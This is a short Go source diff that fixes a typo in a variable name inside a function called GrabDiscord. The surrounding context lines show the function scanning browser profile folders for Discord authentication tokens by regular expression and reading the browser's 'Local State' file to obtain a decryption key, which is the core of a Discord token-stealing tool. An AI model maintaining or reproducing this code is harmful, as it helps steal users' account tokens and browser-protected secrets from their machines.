@@ -60,7 +60,7 @@ func GrabDiscord() []string {
 
 	var tokens []string
 	browserRegex := regexp.MustCompile(browser)
-	discordRegix := regexp.MustCompile(discord)
+	discordRegex := regexp.MustCompile(discord)
 
 	for _, path := range browsersPaths {
 		files, err := os.ReadDir(path)
@@ -121,7 +121,7 @@ func GrabDiscord() []string {
 
 			for scanner.Scan() {
 				line := scanner.Text()
-				matches := discordRegix.FindAllString(line, -1)
+				matches := discordRegex.FindAllString(line, -1)
 
 				password, err := utils.GetPassword(filepath.Join(roaming, name, "Local State"))
 				if err != nil {
